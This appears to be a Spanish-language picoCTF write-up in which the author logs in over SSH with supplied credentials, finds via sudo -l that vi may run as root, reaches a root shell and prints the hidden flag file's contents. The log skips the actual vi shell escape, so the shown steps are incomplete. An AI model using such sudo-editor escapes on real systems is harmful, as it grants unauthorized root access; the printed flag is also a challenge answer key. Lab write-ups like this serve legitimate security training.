## Descripción
Can you read files in the root file? The system admin has provisioned an account for you on the main server: `ssh -p 62923 picoplayer@saturn.picoctf.net` Password: `j4ks-9nxB-` Can you login and read the root file?
## Solución
primero accedemos a la conexion ssh luego usamos sudo -l para saber que comandos se pueden usar con sudo al ver que salen tres directorios probamos con el ultimo vi y damos con sudo 'vi' test para ejecutar el editor con privilegios luego.al ya tener privilegios de root usamos un ls -la mostramos los archivos ocultos y al ver uno llamado flag.txt con cat lo abrimos para ver su contenido y alli encontramos la llave

```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ /usr/bin/vi

root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Sep 15 00:10 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}

```
## Referencias
ls -la --> comando para ver archivos ocultos
sudo -l --> para ver que comandos podemos hacer con sudo
cat --> para abrir el contenido de un archivo